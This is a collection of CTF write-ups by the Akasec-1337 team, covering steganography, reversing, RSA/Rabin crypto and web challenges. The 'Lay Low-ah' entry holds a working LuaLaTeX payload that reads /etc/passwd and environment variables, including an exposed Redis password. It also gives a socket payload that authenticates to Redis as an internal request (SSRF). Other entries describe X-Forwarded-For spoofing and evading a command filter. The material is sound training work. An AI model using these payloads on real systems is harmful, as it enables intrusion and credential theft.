<!--
LICENSE UPL
Author: Mauro Risonho de Paula Assumpção
Data Create: 2026-03-16
Data Update: 2026-03-16
-->

---
name: writeup-akasec-1337
description: CTF writeups and security challenges by Akasec-1337.
---

# Writeups by Akasec-1337

Source repository: `/repos/Akasec-1337`

## Repository Index

- ctf-writeups/README.md
- ctf-writeups/2019/README.md
- ctf-writeups/2020/README.md
- ctf-writeups/2021/README.md
- ctf-writeups/2022/K3RN3LCTF-2022/forensics/README.md
- ctf-writeups/2022/K3RN3LCTF-2022/rev/README.md
- ctf-writeups/2022/GDG-Algiers-CTF-2022/web/cookauth/README.md
- ctf-writeups/2022/GDG-Algiers-CTF-2022/web/ezphp/README.md
- ctf-writeups/2022/GDG-Algiers-CTF-2022/web/lay-lowah/README.md
- ctf-writeups/2022/GDG-Algiers-CTF-2022/crypto/eXORcist/README.md
- ctf-writeups/2022/AkaSec-Local-CTF-2022/web/secret of konoha/README.md
- ctf-writeups/2022/AkaSec-Local-CTF-2022/reversing/classic/README.md
- ctf-writeups/2022/AkaSec-Local-CTF-2022/crypto/Meganumerophobia/README.md
- ctf-writeups/2022/AkaSec-Local-CTF-2022/Forensics/tobiya_irl/readme.md
- ctf-writeups/2021/0x41414141/crypto/README.md
- ctf-writeups/2020/mrctf2020/rev/README.md
- ctf-writeups/2020/mrctf2020/web/README.md
- ctf-writeups/2020/RACTF-2020/pwn/README.md
- ctf-writeups/2020/RACTF-2020/stego/README.md

## Writeup Content


### File: ctf-writeups/2019/README.md

 



### File: ctf-writeups/2020/RACTF-2020/pwn/README.md

## pearl pearl pearl

pearlpearlpearlpearlpearlpearlpearlpearlpearlpearlpearlpearlpearlpearlpearl

**ractf{p34r1_1ns1d3_4_cl4m}**

**Solution:** When we connect to server we are given a weird stream of data that contain ctf{pearlpearlpearl}.

After longue research on it, a message was hidden by using a carriage return symbol so when you are connected to the server and the output is printed to the terminal you can't see the message as the symbol makes the terminal overwrite the data in the line, but if you check the actual data printed by the server you can see the message.
So, I wrote a short script which connects to the server, reads the data and prints it to the screen without special symbols taking effect (and most importantly carriage return), but it didnt work, it's seems that even though there are a lot of carriage return symbols in the data there aren't any hidden messages.

With that in mind, I wrote a short script which creates a empty string, reads until an end of a false flag and check if the symbol afterwards is new line or carriage return and append 0 or 1 to the string accordinaly, in the end it encodes the binary string to ascii characters and prints them:

```python 3
from pwn import remote
import binascii
host = "88.198.219.20"
port = 22324
s = remote(host, port)
flag = ''
try:
    while 1:
        s.recvuntil("}")
        end = str(s.recv(1))
        if 'r' in end:
            flag += '0'
        else:
            flag += '1'
except EOFError:
    print(''.join([chr(int(flag[i:i + 8], 2)) for i in range(0, len(flag), 8)]))
```
and I got the flag:

ractf{p34r1_1ns1d3_4_cl4m}

**Resources:**
* Writeup for clam clam clam challenge from AngstromCTF 2020: https://ctftime.org/writeup/18869



### File: ctf-writeups/2020/RACTF-2020/stego/README.md

## Mad CTF Disease
Todo:\
[x] Be a cow\
[x] Eat grass\
[x] Eat grass\
[x] Eat grass\
[ ] Find the flag

**ractf{exp3rt-mo0neuv3r5}**

**Solution:**

<p align="center">
  <img src="https://cdn.discordapp.com/attachments/635278809741918218/1033552660957237338/unknown.png">
</p>

First thing I do when faced with images is to check strings, and also i use binwalk to check if there are any embedded files in the images, as expected binwalk finds nothing in this image, afterwards I check using steghide also for embedded files, It supposed to do a better job but I mostly use it by habit because binwalk almost always finds the same files.

After using steghide we manage to extract a file if we take a look at the file steghide found we see a really bizzare text constructed only by moo's:

```
OOOMoOMoOMoOMoOMoOMoOMoOMoOMMMmoOMMMMMMmoOMMMMOOMOomOoMoOmoOmoomOo
MMMmoOMMMMMMmoOMMMMOOMOomOoMoOmoOmoomOoMMMmoOMMMMMMmoOMMMMOOMOomOo
MoOmoOmooOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoO
MMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoO
MoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoO
moOMMMMOOMOomoOMoOmOomoomoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOo
moOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoomOo
OOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOo
moOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoO
MoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoO
MMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMM
moOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOo
mOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoO
MoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoO
moOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMM
moOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOo
mOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoo
mOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOO
MOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoO
MoomOoOOOmoOOOOmOomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMM
moOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMM
moOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOo
mOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoomOoOOOmoOOOOmOomOo
MMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOo
mOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoomOoOOOmoO
OOOmOomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoO
MoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoo
mOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoO
MoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOo
MMMmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoO
MoOMoOMoOMoOMoomOoOOOmoOOOOmOomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoo
moOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOO
mOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOo
moomoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOo
mOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoo
moOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoo
mOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOo
moOMoOmOomoomoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOo
moOMoOmOomoomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoO
moOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoOMoOMoOMoOMoomOoOOOmoOOOOmOomOo
mOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoO
MoOmOomoomoOMoOMoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOo
moomOomOoMMMmoOmoOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOO
MOomoOMoOmOomoomoOMoOMoOMoomOoOOOmoOOOOmOomOomOoMMMmoOmoOMMMMOOMOo
moOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoomoOMoOMoOMoO
MoOMoOMoomOoOOOmoOOOOmOomOoMMMmoOMMMMOOMOomoOMoOmOomoomOomOoMMMmoO
moOMMMMOOMOomoOMoOmOomoomOomOomOoMMMmoOmoOmoOMMMMOOMOomoOMoOmOomoo
moOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoOMoomOo
```

I recognized this text when I first saw this as the programming language called COW, an esoteric programming language created in the 90's, Now we only need to find an interpreter for this code, I used a random one after a quick google search and run it on the code:

![](https://cdn.discordapp.com/attachments/635278809741918218/1033553913049272441/unknown.png)

and we got our cow-scented flag.

**Resources:**
* steghide: http://steghide.sourceforge.net/
* COW programming language: https://esolangs.org/wiki/COW
* COW interpreter: http://www.frank-buss.de/cow.html




### File: ctf-writeups/2020/README.md

 



### File: ctf-writeups/2020/mrctf2020/rev/README.md

## Xor (On-campus only)

XOR the data after XOR once to get the original data XOR the input character and serial number, and then compare it with the target array, so you only need to reverse the target array and XOR again to get the flag

```c
#include<cstdio>
#include<cstring>
#include<cstdlib>
char flag[100]={0x4D,0x53,0x41,0x57,0x42,0x7E,0x46,0x58,0x5A,0x3A,0x4A,0x3A,0x60,0x74,0x51,0x4A,0x22,0x4E,0x40,0x20,0x62,0x70,0x64,0x64,0x7D,0x38,0x67};
int main()
{
	for(int i=0;i<strlen(flag);i++)
	{
		unsigned char tmp=flag[i];
		tmp^=i;
		printf("%c",tmp);
	}
	return 0;
}
```

Get flag: MRCTF{@_R3@1ly_E2_R3verse!}



### File: ctf-writeups/2020/mrctf2020/web/README.md

## PYWebsite

A simple front-end trick question, I hope more people will notice that front-end verification is insecure.

The first step is to go through the business logic, which is the process of purchasing the authorization code and then verifying the authorization code. The loopholes in the audit verification process naturally come to mind. Click the button to pop up the window is controlled by js, and then guess the verification logic is in the front end, so look at the source code and find the logic as follows:


Don't know about MD5? In fact, we don't need to care about the front-end verification at all, we just need to jump directly to flag.php. (md5("ARandomString"))

Enter flag.php, the title tells us that only a specific IP can be accessed, and it is a back-end verification. In fact, it doesn't make sense for the application layer to use XFF to verify IP. PHP uses the X-Forward-For http request header to verify, and this request header we can forge.

We don't know the buyer's IP, but we know the "own" IP, which is the local loopback address 127.0.0.1. Therefore, you only need to use the packet capture software to capture the HTTP request packet and modify it (add X-Forwarded-For: 127.0.0.1a line) to deceive the verification logic. The last flag font I changed to white hhh, so we need to observe the verification logic of the source code backend as follows:

```python
function checkXFF() {
  if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    if (strpos($ip, "127.0.0.1") !== false) {
      return true;
    }
  }
  return false;
}
```

By the way, how to verify the real IP of the user? It's really not easy to do. Because users may use a proxy (called a forward proxy), our server will also perform forwarding operations such as load balancing (called a reverse proxy) due to business requirements. But if this process is not through a proxy, generally using Remote_Addr can get the real IP. flag:MRCTF{Ba1_Pia0_Flag_1s_ve7y_H4PPY!}





### File: ctf-writeups/2021/0x41414141/crypto/README.md

# eazy RSA (445)
> c = 3708354049649318175189820619077599798890688075815858391284996256924308912935262733471980964003143534200740113874286537588889431819703343015872364443921848 <br>
> e = 16 <br>
> p = 75000325607193724293694446403116223058337764961074929316352803137087536131383 <br>
> q = 69376057129404174647351914434400429820318738947745593069596264646867332546443 <br>

## Solution
```sage
ZeroDivisionError: inverse of Mod(16, 5203226874048586660123187369475542584442690830335849146139399959453354953924976900388993415470710574187687844214029203747760116730703556445063231528642844) does not exist
```
[Rabin cryptosystem](https://en.wikipedia.org/wiki/Rabin_cryptosystem) and as Wiki says

*The message **m** can be recovered from the ciphertext **c** by taking its square root modulo n as follows.*

In this case we can recover **m** by repeatedly taking ciphertext's (c) square root modulo n as follows,

```py
from Crypto.Util.number import *

def egcd(a, b):
    x,y, u,v = 0,1, 1,0
    while a != 0:
        q, r = b//a, b%a
        m, n = x-u*q, y-v*q
        b,a, x,y, u,v = a,r, u,v, m,n
    gcd = b
    return gcd, x, y

def decrypt(c):
    mp = pow(c, (p+1)//4, p)
    mq = pow(c, (q+1)//4, q)
    r1 = (yp*p*mq + yq*q*mp) % n
    r2 = n-r1 
    r3 = (yp*p*mq - yq*q*mp) % n
    r4 = n-r3
    return (r1,r2,r3,r4)


c = [3708354049649318175189820619077599798890688075815858391284996256924308912935262733471980964003143534200740113874286537588889431819703343015872364443921848]
p = 75000325607193724293694446403116223058337764961074929316352803137087536131383
q = 69376057129404174647351914434400429820318738947745593069596264646867332546443
n = p*q

# Rabin's test
assert p % 4 == 3
assert q % 4 == 3

_, yp, yq = egcd(p,q)
# print(yp,yq)

for i in range(4):
    pts = []
    for ct in c:
        pts += decrypt(ct)
    c = pts
for m in c:
    dec = long_to_bytes(m)
    if b'flag' in dec:
        print(dec)

# flag{d0nt_h4v3_4n_3v3n_3_175_34sy!!!}
```



### File: ctf-writeups/2021/README.md

 



### File: ctf-writeups/2022/AkaSec-Local-CTF-2022/crypto/Meganumerophobia/README.md

# Meganumerophobia

N = 123536064164139504718275064269913509942218319347640973269872257382194760838729086261914280412305602133850510043881523444330171567517820066827513095775693034489202078955981042875624061355151848686073635461915867708508827192798870018423289686855770187991093844972451881756937570076069209140735021093628404629683

E = 92370846707748897500296351665818073398586454136545714500109133235541482744024550126156073549534699178879840146525944763829999796895084166100935176345214466820330114013766743408230087643320164150699132430112387071160308101557300570496099251514906798335785688872418279466203772084569302164740651911244453869567

c = 18558348214847512573294588511266840380348405132842531472553850711388470657627464594921088830162510169049111893584325573658059621310419495034734959331066927106667055290456052616736656675124261379322618015210674889106071447600463640756792023778923840933422853879463970630072574489632844747555059602937877225343


Clairement c'est RSA, avec un trés grand exposant. Ce genre d'exposant est vulnérable a l'attaque de Wiener si l'exposant privé est faible.
Il n'y a qu'un seul moyen de s'en assurer:

J'ai essayé RsaCtfTool mais il m'a pris beaucoup de temp, J'ai trouvé ces scripts après avoir recherché un autre moyen: [continued_fractions](https://gist.github.com/mananpal1997/73d07cdc91d58b4eb5c818aaab2d38bd). on change les valeurs N, E et C et on lance le script:
```
┌──(kali㉿cr1ngyk4li)-[~/Rsa/]
└─$ python2 rsa_2.py
00000010010000010001001000001000001000000001001101011000010000011100001000100000
```
Premier coup d'oeil a l'output j'ai pensé que ça était en binaire mais apparemment c'est du Bacon Cipher.

![img](assets/1.png)


FLAG : AKASEC{BACONEDRSA}






### File: ctf-writeups/2022/AkaSec-Local-CTF-2022/reversing/classic/README.md

# classic

Download the challenges file, we are greeted with a flag file and 2 java classes

```bash
┌──(kali㉿cr1ngyk4li)-[~/dir]
└─$ ls -l
total 12
-rw-r--r-- 1 kali kali  405 Jun 12 02:51 classic.class
-rw-r--r-- 1 kali kali  112 Jun 12 02:51 flag
-rw-r--r-- 1 kali kali 1092 Jun 12 02:51 FlagEncrypt.class
```
flag is obviously encrypted, let's check how by decompiling`FlagEncrypt.class` with jd-gui
![img](assets/1.png)

so the function `encrypt_flag` xor's each character of the flag with `0x4D` and append a space

```java
	for (byte b = 0; b < paramString.length(); b++) {
			stringBuilder.append(paramString.charAt(b) ^ 0x4D);
			stringBuilder.append(' ');
    	}
```
Solving this is pretty simple, we take each element and xor it again with `0x4D`:

```python
with open("flag") as f:
    l = str(f.readlines()[0])
    lst = l.split(" ")
    for i in lst:
        print(chr(int(i) ^ 0x4d), end="")
    print("\n")
```

Running it will give us the flag: `AKASEC{Hope_You_Learned_A_Thing_or_Two}`



### File: ctf-writeups/2022/AkaSec-Local-CTF-2022/web/secret of konoha/README.md

# Web

# Secret of Konoha

This challenge was pretty straightforward, visiting the url you will be greeted with the following source code

![Screen Shot 2022-10-21 at 12.39.47 PM.png](assets/Screen_Shot_2022-10-21_at_12.39.47_PM.png)

so the first it does is check how many  elements we have the `args` array, then it checks if any of the first two elements are `cat` (we can use `tac` , `head` or `tail` 😏).

Then it executes our whatever we passed in the `args` array.

Let’s try list the root directory :

![Screen Shot 2022-10-21 at 12.55.46 PM.png](assets/Screen_Shot_2022-10-21_at_12.55.46_PM.png)

we can see a secret file, let’s check it’s content:

![Screen Shot 2022-10-21 at 1.00.03 PM.png](assets/Screen_Shot_2022-10-21_at_1.00.03_PM.png)

Looks like a base64, decoding it will give us the flag

```bash
└─$ echo "QUtBU0VDe1czX2M0bl9EMF8xVH0=" | base64 -d
AKASEC{W3_c4n_D0_1T}
```



### File: ctf-writeups/2022/GDG-Algiers-CTF-2022/crypto/eXORcist/README.md

The solution for the challenge is pretty simple, the server receives the text and place the flag randomly inside it, then generate a key and xor with the text.

The challenges is therefore vulnerable to the repeated key attack. The first step would be to get the key by sending a long text with known caracters, the result is xored with the sent text in order to get the key, and decrypt the flag part.



### File: ctf-writeups/2022/GDG-Algiers-CTF-2022/web/cookauth/README.md

## Writeup

[Solve script](./solve.py).



### File: ctf-writeups/2022/GDG-Algiers-CTF-2022/web/ezphp/README.md

-PHP 5.3 doesn't handle HEAD requests correctly

-So the solution is to first send a HEAD request to /index.php

-It will set SESSION[admin] to 1 and stop before setting it back to 0

-Then send another GET request with the same session and you will get the flag



### File: ctf-writeups/2022/GDG-Algiers-CTF-2022/web/lay-lowah/README.md

# Lay Low-ah

## Writeup

1. First of all, we try to load files using input and include, but it doesn't seem to work.

2. From the description we understand that it's one of the latex compilers for linux, and from the name of the challenge, we can guess that it's `LuaLaTeX`.

3. Lualatex offers a command to execute lua code, which is `\directlua`, and we're going to use it in order to exfiltrate all the infos that we need.

4. We'll try to read files with it:

    ```latex
    \documentclass{book}
    \begin{document}
    \directlua{

        local file = io.open("/etc/passwd", "r")
        local text = file:read("*all")
        file:close()
        tex.print(-2, text)

    }
    adscrf
    \end{document}
    ```

    We can see that it works!

5. Since it's a flask app, we can guess `app.py` file, we'll try to read it:

    ```python
    #!/usr/bin/python3

    from flask import Flask, request, render_template, redirect, url_for, make_response
    from utils import PDF, remove_pdfs, make_cache_key
    from flask_caching import Cache, CachedResponse

    app = Flask(__name__)
    app.config.from_object('config.BaseConfig')  
    cache = Cache(app)


    @app.route("/", methods=["GET", "HEAD"])
    def root():
        return redirect(url_for("compile"))


    @app.route("/compile", methods=["GET", "POST", "HEAD"])
    @cache.cached(timeout=30, key_prefix=make_cache_key)
    def compile():
        pdf = None

        if request.method == "GET":
            return render_template("./compile.html", pdf=pdf)
        elif request.method == "POST":
            latex_text = request.form.get("latex_text")

            try:
                pdf = PDF(latex_text).generate_pdf()
                if pdf is not None:
                    result = "Compiled successfully!"
                    return CachedResponse(
                        response=make_response(
                            render_template(
                                "./compile.html", result=result, pdf=pdf
                            )
                        )
                        ,timeout=50,
                    )
                else:
                    raise Exception("")
            except Exception as e:
                print(e)
                result = "something is going wrong"
                pdf = None
                return render_template("./compile.html", result=result, pdf=pdf)
        else:
            return render_template("./compile.html")
    ```

6. We notice that it's using flask_caching, hence the optimization in the rendering as it's mentioned in the description. After some documentation, we understand that the config of caching it's imported from `config.py` here:

    ```python
    app.config.from_object('config.BaseConfig')
    ```

7. We dump the `config.py`:

    ```python
    import os

    URL = "http://localhost:8000"


    class BaseConfig(object):
        CACHE_TYPE = os.environ['CACHE_TYPE']
        CACHE_REDIS_HOST = os.environ['CACHE_REDIS_HOST']
        CACHE_REDIS_PORT = os.environ['CACHE_REDIS_PORT']
        CACHE_REDIS_DB = os.environ['CACHE_REDIS_DB']
        CACHE_REDIS_URL = os.environ['CACHE_REDIS_URL']
        CACHE_DEFAULT_TIMEOUT = os.environ['CACHE_DEFAULT_TIMEOUT']
        # os.system('lua /ctf/insert_flag.lua')
        # os.system('rm /ctf/insert_flag.lua')
    ```

8. We see that it's using Redis for caching, and from the 2 last lines, we can deduct that probably the flag is pushed to redis and it's not anymore on the server.

9. We can retrieve the environment variables from `/proc/self/environ` file:

    ```env
    HOSTNAME=5010384e97f6
    CACHE_REDIS_URL=redis://:JtmvalTXG91siKBIrCxmsDfXNfkl8Gck@cache:6379/0
    PWD=/ctf
    CACHE_TYPE=redis
    HOME=/root
    LANG=CUTF-8T
    EXLIVE_INSTALL_NO_CONTEXT_CACHE=1
    CACHE_REDIS_HOST=cache
    TERM=xterm
    CACHE_REDIS_DB=0
    SHLVL=1
    CACHE_REDIS_PORT=6379
    FLASK_DEBUG=production
    LC_ALL=C.UTF-8
    CACHE_DEFAULT_TIMEOUT=500
    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
    NOPERLDOC=1_=/bin/cat
    ```

10. Now, we have redis credentials, we have to be able to communicate with redis server using Lua.

11. Trying to use redis packages won't help because they are not installed. But if we check `socket` one, we find that it works.  

    Redis doesn't support http requests, even socket module doesn't support gopher protocol, so we are obliged to communicate with redis by using tcp socket and send the exact syntax that redis uses.  
    After documentation, the syntax is:

    ```lua
    "*2\r\n$4\r\nGET\r\n$1\r\n*\r\n"
    ```

    This line will get all entries.  
    We will start to craft our payload.

12. We notice that Latex has a problem with all these special chars, so we will use Hexadecimal instead, decode it then send it.

13. Without forgeting the authentication part, and after printing all the keys, we find that flag is `FLAG`.

    So the final payload is:  

    ```lua
    "*2\r\n$4\r\nAUTH\r\n$32\r\nJtmvalTXG91siKBIrCxmsDfXNfkl8Gck\r\n*2\r\n$3\r\nGET\r\n$4\r\nFLAG\r\n"
    ```

    And here's the latex document to send:

    ```latex
    \documentclass{book}
    \begin{document}
    \directlua{
        function fromHex(str)
            return (str:gsub('..', function (cc)
                return string.char(tonumber(cc, 16))
            end))
        end
        str = "2a320d0a24340d0a415554480d0a2433320d0a4a746d76616c545847393173694b42497243786d734466584e666b6c3847636b0d0a2a320d0a24330d0a4745540d0a24340d0a464c41470d0a"
        local res = fromHex(str)
        local host, port = "cache", 6379
        local socket = require("socket")
        local tcp = assert(socket.tcp())
        tcp:connect(host, port);
        tcp:send(res);
        tcp:settimeout(2)
        for i=1,3 do
            local s, status, partial = tcp:receive()
            tex.print(-2,s,partial)
        end
        tcp:close()
    }
    \end{document}
    ```

14. The flag is `CyberErudites{r3d1s_0bv105l7y_m34n5_55RF}`.



### File: ctf-writeups/2022/K3RN3LCTF-2022/forensics/README.md

## Zabomb

Description : You received a suspicious file from the k3rn3l4rmy hacking group, the title says ‘Not a Zip Bomb, Please Open’, you decide NOT to open it and instead try to reverse it. It is recommended that you do NOT open this, it will fill your entire disk.

First of all we google the definition of "zip bomb"

Definition : A zip bomb, also known as a decompression bomb or zip of death is a malicious archive file designed to crash or render useless the program or system reading it. It is often employed to disable antivirus software, in order to create an opening for more traditional malware.

Steps i did to solve the challenge :

1. I uploaded the zip file in a vps.
	
2. Unzip it with "unzip -l" to list archive files.
	
3. look at the result.
	
4. unzip the file even if it will take a long time.
	
5. look at the strings unside the file with the smallest size between the 65k files unziped.

flag{w0w_c0mpres51on_&_d3comp53ssi0N_!s_s0_c3wl_ju5t_d0n7_gO_b0OM}




### File: ctf-writeups/2022/K3RN3LCTF-2022/rev/README.md

## WannaSwirl

Description : One of the office computers has been hit by a ransomware made by the k3rn3l4rmy hacking group!! We need to recover the flag from the hard drive otherwise the company will fail. Hopefully the malware has some issues. THIS IS LINUX MALWARE DO NOT RUN ON A MACHINE YOU CARE ABOUT.


Definition of a ransomware : A type of malicious software designed to block access to a computer system until a sum of money is paid.


Steps i did to solve the challenge:
	
I looked at the given txt file and noticed that was a reversed text, so i searched the word "galf" means flag in reverse and i found all the flag in reverse

}3kup_4nn0g_m1_kn1ht_1_yzz1d_0s_gn1tt3g_m1_w0w{galf.


flag{w0w_1m_g3tt1ng_s0_d1zzy_1_th1nk_1m_g0nn4_puk3}



### File: ctf-writeups/README.md

# Akasec's CTF Writeups

- [2019 writeups](./2019)
- [2020 writeups](./2020)
- [2021 writeups](./2021)
- [2022 writeups](./2022)



### File: ctf-writeups/2022/AkaSec-Local-CTF-2022/Forensics/tobiya_irl/readme.md

#Tobiya IRL

